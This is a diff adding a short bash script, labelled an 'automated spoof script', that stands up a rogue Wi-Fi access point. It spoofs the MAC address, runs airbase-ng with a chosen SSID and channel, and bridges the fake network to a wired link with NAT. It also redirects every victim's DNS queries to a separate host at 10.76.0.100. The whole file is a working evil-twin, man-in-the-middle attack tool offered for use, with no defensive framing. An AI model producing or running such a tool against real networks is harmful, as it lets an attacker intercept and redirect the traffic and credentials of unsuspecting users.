@@ -1,0 +1,54 @@
+#JB --automated spoof script
+
+#echo "what's your internet interface?"
+#read inet
+echo "what's your wireless interface?"
+read wlan
+
+#Kill the stale stuff
+airmon-ng stop $wlan
+
+#dropt he interface
+ifconfig $wlan down
+
+#spoof my MAC
+macchanger --mac 00:11:22:33:44:55 $wlan
+
+#spin all the wlan stuff up
+airmon-ng start $wlan
+
+#kill any misc airbase instances
+killall airbase-ng
+
+#deets
+echo "what's the ssid you want to spoof/create?"
+read ssid
+
+echo "what channel?"
+read channel
+
+#echo "what interface?"
+#read interface
+
+gnome-terminal -e "airbase-ng -c $channel -e $ssid $wlan"
+sleep 5
+
+brctl addbr BRIDGE
+brctl addif BRIDGE eth0
+brctl addif BRIDGE at0
+ifconfig eth0 0.0.0.0 up
+ifconfig at0 0.0.0.0 up
+ifconfig BRIDGE 10.76.28.10 up
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables --table nat --append POSTROUTING --out-interface BRIDGE -j MASQUERADE
+iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 10.76.0.100
+
+
+echo "hit enter to stop all this shit"
+read done
+ifconfig BRIDGE down
+brctl delbr BRIDGE
+airmon-ng stop mon0
+airmon-ng stop mon1
+airmon-ng stop wlan0
+
